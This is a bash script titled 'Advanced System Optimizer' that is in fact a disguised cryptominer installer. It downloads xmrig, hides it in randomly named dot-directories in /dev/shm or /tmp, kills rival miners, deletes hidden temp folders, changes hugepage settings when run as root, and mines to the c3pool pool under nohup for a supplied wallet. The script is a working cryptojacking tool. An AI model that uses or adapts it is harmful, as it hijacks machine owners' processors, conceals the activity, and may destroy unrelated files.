#!/bin/bash
VERSION=2.28
echo "Advanced System Optimizer v$VERSION"
echo "Works on ANY server - auto.c3pool.org:19999 - 85% CPU"
echo
export LC_ALL=C
export LANG=C

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet>"
    exit 1
fi

# --- چک curl/tar ---
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    echo "ERROR: Install curl & tar first: apt-get install -y curl tar"
    exit 1
fi

# --- CPU ---
CPU_TOTAL=$(nproc)
USABLE_THREADS=$(( CPU_TOTAL > 6 ? 6 : CPU_TOTAL ))
[ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1
CPU_HINT=85

echo "[*] $CPU_TOTAL cores → $USABLE_THREADS threads @ $CPU_HINT%"

# --- انتخاب مسیر امن (اولویت: RAM → /tmp → /var/tmp) ---
BASE_DIR=""
for dir in "/dev/shm" "/tmp" "/var/tmp"; do
    if mkdir -p "$dir/.hidden_$(openssl rand -hex 8)" 2>/dev/null && chmod 700 "$dir/.hidden_"* 2>/dev/null; then
        BASE_DIR="$dir/.$(basename $(ls -d $dir/.hidden_* | head -1) | cut -c9-)"
        rm -rf "$dir/.hidden_"* 2>/dev/null
        break
    fi
done

[ -z "$BASE_DIR" ] && echo "ERROR: No writable directory" && exit 1

RAND_HEX=$(openssl rand -hex 16)
BASE_DIR="$BASE_DIR/.$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"

echo "[*] Installing in: $BASE_DIR (RAM or /tmp - auto-clean on reboot if possible)"

mkdir -p "$BASE_DIR" "$LOG_DIR" 2>/dev/null
chmod 700 "$BASE_DIR" "$LOG_DIR" 2>/dev/null

# --- پاک‌سازی ---
pkill -9 -f xmrig 2>/dev/null
find /tmp /var/tmp /dev/shm -type d -name ".*" -exec rm -rf {} + 2>/dev/null

# --- hugepages (root only) ---
if [ "$(id -u)" -eq 0 ]; then
    [ ! -f /etc/sysctl.conf ] && touch /etc/sysctl.conf
    grep -q "vm.nr_hugepages=1280" /etc/sysctl.conf || echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
    sysctl -p /etc/sysctl.conf >/dev/null 2>&1
    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
fi

# --- دانلود ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP="/tmp/.xmrig_$(date +%s).tgz"

echo "[*] Downloading xmrig..."
curl -fsSL "$URL" -o "$TMP" || { echo "Download failed"; exit 1; }
tar xzf "$TMP" -C /tmp/ >/dev/null 2>&1 || { rm -f "$TMP"; exit 1; }

XMRIG_BIN=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
[ -z "$XMRIG_BIN" ] && echo "ERROR: xmrig not found" && rm -f "$TMP" && exit 1

cp "$XMRIG_BIN" "$BASE_DIR/main" && chmod +x "$BASE_DIR/main" || { echo "ERROR: Copy failed"; rm -rf "$BASE_DIR"; exit 1; }

rm -f "$TMP"
find /tmp -name "xmrig*" -type d -exec rm -rf {} + 2>/dev/null

# --- config با auto.c3pool.org:19999 (بدون TLS) ---
SYSTEM_USER="opt$(openssl rand -hex 6)"
cat > "$BASE_DIR/config.json" << EOF
{
    "donate-level": 0,
    "randomx": { "mode": "fast", "1gb-pages": true },
    "cpu": { "enabled": true, "huge-pages": true, "priority": 5, "yield": false },
    "pools": [{
        "url": "auto.c3pool.org:19999",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$SYSTEM_USER",
        "tls": false,
        "keepalive": true
    }],
    "print-time": 5,
    "retries": 10,
    "retry-pause": 2,
    "verbose": 2,
    "log-file": "$LOG_DIR/out.log"
}
EOF

# --- اجرا ---
echo "[*] Starting miner with auto.c3pool.org:19999..."
nohup "$BASE_DIR/main" \
    --config="$BASE_DIR/config.json" \
    --threads=$USABLE_THREADS \
    --cpu-max-threads-hint=$CPU_HINT \
    --cpu-priority=5 \
    --cpu-no-yield \
    > "$LOG_DIR/out.log" 2>&1 &

PID=$!
echo $PID > "$BASE_DIR/.pid" 2>/dev/null || true
echo "PID: $PID"

echo "Waiting 30 seconds for connection & full load..."
sleep 30

# --- وضعیت ---
echo
echo "=== FINAL STATUS ==="
if kill -0 $PID 2>/dev/null; then
    CPU=$(ps -p $PID -o %cpu --no-headers 2>/dev/null | awk '{printf "%.0f", $1}')
    echo "PID $PID → $CPU% CPU"
    if [ "$CPU" -gt 200 ]; then
        echo "SUCCESS: Mining active!"
        tail -10 "$LOG_DIR/out.log" | grep -E "accepted|speed"
    else
        echo "LOW CPU - Check connection:"
        tail -20 "$LOG_DIR/out.log" | grep -E "connect|accepted|error|job"
    fi
else
    echo "ERROR: Miner crashed"
    tail -20 "$LOG_DIR/out.log" 2>/dev/null
fi

echo
echo "Path: $BASE_DIR"
echo "Logs: tail -f $LOG_DIR/out.log"
echo "Stop: pkill -f $BASE_DIR/main"
echo "htop: One line ~$((USABLE_THREADS * 85))% CPU"

exit 0
